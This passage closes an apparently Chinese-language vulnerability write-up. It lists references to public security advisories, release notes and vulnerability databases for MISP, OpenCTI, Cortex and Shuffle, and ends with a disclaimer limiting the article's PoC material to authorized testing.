2. **MISP 安全发布 - CVE-2023-3996, CVE-2023-3997, CVE-2024-28534, CVE-2024-45291**：https://github.com/MISP/MISP/releases
3. **OpenCTI 安全公告 - CVE-2023-2904 & CVE-2024-29890**：https://github.com/OpenCTI-Platform/opencti/security/advisories
4. **Cortex 安全公告 - CVE-2023-37461 & CVE-2023-37462**：https://github.com/TheHive-Project/Cortex-Analyzers/security/advisories
5. **Shuffle 安全发布 - CVE-2023-26574, CVE-2024-3403, CVE-2023-33831**：https://github.com/Shuffle/Shuffle/releases
6. **NIST NVD 漏洞数据库**：https://nvd.nist.gov/
7. **CISA 已知被利用漏洞目录（KEV）**：https://www.cisa.gov/known-exploited-vulnerabilities-catalog
8. **ProjectDiscovery Nuclei 模板库**：https://github.com/projectdiscovery/nuclei-templates
9. **TheHive 项目官方文档**：https://docs.strangebee.com/thehive/
10. **MISP 项目官方文档**：https://www.misp-project.org/documentation/

---

> **免责声明**：本文所涉及的漏洞分析、PoC 代码和利用技术仅用于授权安全测试和教育目的。未经授权对目标系统进行漏洞检测和利用是违法行为。本文作者不对因使用文中信息而导致的任何直接或间接损失承担责任。读者在使用本文信息前，必须确保已获得合法授权，并遵守当地法律法规。所有 PoC 代码均应在隔离测试环境中运行，严禁在生产环境中使用。